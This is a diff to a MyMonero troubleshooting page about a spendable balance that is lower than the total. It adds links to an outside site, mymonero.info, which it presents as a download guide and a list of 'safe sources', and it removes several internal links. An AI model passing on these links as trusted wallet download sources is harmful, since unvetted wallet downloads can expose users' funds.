@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 The spendable balance excludes funds that are still pending or locked, and a send also needs room for its transaction fee. Check transaction status and wallet scanning before assuming that your total balance can be transferred immediately.
 
+
+Prefer reading on the web? The [MyMonero spendable balance too low page](https://mymonero.info/mymonero-spendable-balance-too-low) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.
+
 ## You'll see this if
 - MyMonero shows a total amount but a smaller amount available to send.
 - A transfer reports insufficient funds even though XMR appears in the wallet.
@@ -36,10 +39,10 @@ MyMonero desktop's final release is v1.3.3, for Windows (.exe), macOS (.dmg), an
 ---
 ## Fix
 1. **Compare the amounts shown.** Look for separate total, pending, locked, or spendable figures. Use the spendable figure when deciding how much you can send, rather than attempting to spend the full total.
-2. **Check recent incoming transactions.** Review their status in history. If an expected payment does not appear, confirm the receiving address with the sender and consult [transaction not showing](./mymonero-transaction-not-showing.md). Do not ask for or disclose anybody's seed.
+2. **Check recent incoming transactions.** Review their status in history. If an expected payment does not appear, confirm the receiving address with the sender and consult transaction not showing. Do not ask for or disclose anybody's seed.
 3. **Wait for pending funds.** Give the wallet and network time to update. Avoid repeated send attempts while the incoming value remains unavailable. A pending amount is not necessarily ready to use in a new transaction.
-4. **Leave room for the fee.** When preparing a send, check the fee presented by the wallet and reduce the amount if necessary. Do not rely on an old fee estimate or instructions from an unrelated asset. If you are withdrawing to an exchange, follow the exchange's current XMR deposit requirements; see [withdraw XMR from MyMonero](./mymonero-withdraw-to-exchange.md).
-5. **Check whether the wallet is current.** Allow scanning to complete. If the app appears stale, read [MyMonero not syncing](./mymonero-not-syncing.md). Error 523 is general guidance that the server connection is unavailable, not a specific diagnosis of your funds.
+4. **Leave room for the fee.** When preparing a send, check the fee presented by the wallet and reduce the amount if necessary. Do not rely on an old fee estimate or instructions from an unrelated asset. If you are withdrawing to an exchange, follow the exchange's current XMR deposit requirements; see withdraw XMR from MyMonero.
+5. **Check whether the wallet is current.** Allow scanning to complete. If the app appears stale, read MyMonero not syncing. Error 523 is general guidance that the server connection is unavailable, not a specific diagnosis of your funds.
 6. **Review restore details if the wallet was recovered.** Confirm you restored the intended seed in a compatible wallet. A 13-word seed is MyMonero-specific and legacy; a 25-word seed is standard Monero. Make sure the restore height includes the period when you first used the wallet. Earlier is safer but slower.
 7. **Verify before sending.** Check the destination address, amount, and fee in the final review. A transfer to an incorrect address may not be recoverable. Never share a seed, private keys, or password with a person claiming to adjust your spendable balance.
 8. **Recheck after updating.** Once scanning is current and pending funds have changed status, look at the available amount again. Submit only a transaction that the wallet can prepare and that you have reviewed carefully.
@@ -90,6 +93,7 @@ No. Never share your seed. Nobody legitimate should request it to resolve a spen
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
